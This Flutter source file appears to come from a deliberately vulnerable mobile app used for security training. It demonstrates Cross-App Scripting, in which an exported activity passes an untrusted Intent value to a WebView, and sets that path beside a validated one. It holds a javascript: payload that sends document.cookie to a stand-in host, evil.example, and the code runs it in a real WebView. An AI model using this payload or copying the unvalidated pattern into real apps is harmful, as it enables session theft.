import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../../../core/evidence_sink.dart';
import '../../../core/theme/dvma_colors.dart';
import '../../../core/vuln_demo_scaffold.dart';
import '../../../core/webview_demo_host.dart';
import 'cross_app_webview.dart';

/// Cross-App Scripting (Untrusted Intent -> Exported Activity -> WebView JS).
///
/// An exported activity takes an attacker-controlled Intent value and passes it
/// to WebView loadUrl()/evaluateJavascript() without validation, giving JS
/// execution in the trusted origin (Google's named Cross-App Scripting class;
/// Element CVE-2024-26131/26132, FireDown CVE-2024-31974, TikTok
/// CVE-2024-45240).
class CrossAppScriptingScreen extends StatefulWidget {
  const CrossAppScriptingScreen({super.key});

  static const String vulnId = 'cross_app_scripting';

  @override
  State<CrossAppScriptingScreen> createState() =>
      _CrossAppScriptingScreenState();
}

class _CrossAppScriptingScreenState extends State<CrossAppScriptingScreen> {
  static const String _trustedOrigin = 'https://app.dvma.example';

  /// The value a malicious co-resident app puts on the Intent extra the
  /// exported activity reads (`intent.getStringExtra("url")`).
  static const String _attackerIntentValue =
      "javascript:fetch('https://evil.example/x?c='+document.cookie)";

  String? _vulnResult;
  String? _secureResult;
  String? _nativeApplied;

  WebViewController? _controller;

  @override
  void initState() {
    super.initState();
    if (supportsRealWebView) {
      // A real WebView already authenticated to the trusted first-party origin;
      // a javascript: payload run here executes IN that trusted origin.
      _controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..loadRequest(Uri.parse('$_trustedOrigin/account'));
    }
  }

  String _render(WebViewLoadResult r) {
    final b = StringBuffer();
    b.writeln('committed url : ${r.committedUrl ?? '(none)'}');
    b.writeln('blocked       : ${r.blocked}');
    if (r.blockReason != null) {
      b.writeln('block reason  : ${r.blockReason}');
    }
    b.writeln('trusted-origin script executed : ${r.scriptedTrustedOrigin}');
    for (final e in r.executed) {
      b.writeln(
        '  ran in ${e.origin}'
        '${e.trustedOrigin ? ' [TRUSTED ORIGIN]' : ''}: ${e.code}',
      );
    }
    return b.toString().trimRight();
  }

  Future<void> _run() async {
    final webView = CrossAppWebView(trustedOrigin: _trustedOrigin);
    // VULN: exported activity feeds the untrusted Intent value straight in.
    final vuln = webView.loadFromIntent(_attackerIntentValue);
    // SECURE: validate scheme + origin allowlist before loading anything.
    final secure = webView.loadFromIntentSafe(_attackerIntentValue);

    // On Android, actually run the attacker's javascript: payload inside the
    // real in-app WebView that is committed to the trusted first-party origin -
    // the exact loadUrl(javascript:)/runJavaScript sink of the CVE class.
    String? applied;
    final controller = _controller;
    if (controller != null && _attackerIntentValue.startsWith('javascript:')) {
      final js = _attackerIntentValue.substring('javascript:'.length);
      try {
        await controller.runJavaScript(js);
        applied =
            'ran attacker javascript: payload in trusted origin '
            '$_trustedOrigin via the real in-app WebView (no scheme/origin '
            'validation): $js';
      } catch (e) {
        applied = 'native error: $e';
      }
    }
    if (applied != null) {
      await DvmaEvidence.record(
        CrossAppScriptingScreen.vulnId,
        'exported-webview-loaded-url',
        'real WebView executed attacker script in trusted origin: $applied',
      );
    }

    setState(() {
      _vulnResult = _render(vuln);
      _secureResult = _render(secure);
      _nativeApplied = applied;
    });
  }

  @override
  Widget build(BuildContext context) {
    return VulnDemoScaffold(
      vulnId: CrossAppScriptingScreen.vulnId,
      title: 'Cross-App Scripting (Untrusted Intent -> WebView JS)',
      difficulty: DvmaDifficulty.hard,
      explanation:
          'An EXPORTED activity reads an attacker-controlled Intent extra (a '
          'URL string) and hands it straight to a WebView via '
          'loadUrl()/evaluateJavascript() with no validation. The WebView is '
          'already authenticated to the trusted first-party origin '
          '($_trustedOrigin), so a "javascript:" payload from a co-resident '
          "malicious app executes IN that trusted origin and can read the "
          'victim\'s cookies/session (Google\'s Cross-App Scripting class; '
          'Element CVE-2024-26131/26132, FireDown CVE-2024-31974, TikTok '
          'CVE-2024-45240). On Android a "javascript:" payload is actually run '
          'inside a REAL in-app WebView committed to the trusted origin '
          '($_trustedOrigin) via runJavaScript, so it executes IN that trusted '
          'origin and can read the victim\'s cookies/session. The offline model '
          'records what executed and in which origin. The secure path rejects '
          'the "javascript:" scheme and only navigates to https URLs on the '
          'trusted-origin allowlist.',
      children: [
        DemoActionButton(label: 'Deliver malicious Intent', onPressed: _run),
        if (_vulnResult != null)
          EvidencePanel(
            label: 'exported activity -> webView.loadUrl (no validation)',
            value: _vulnResult!,
          ),
        if (_secureResult != null)
          EvidencePanel(
            label: 'validated: scheme + origin allowlist',
            value: _secureResult!,
          ),
        if (_nativeApplied != null)
          EvidencePanel(
            label: 'real WebView ran attacker script in the trusted origin',
            value: _nativeApplied!,
          ),
        RealWebViewView(controller: _controller),
      ],
    );
  }
}
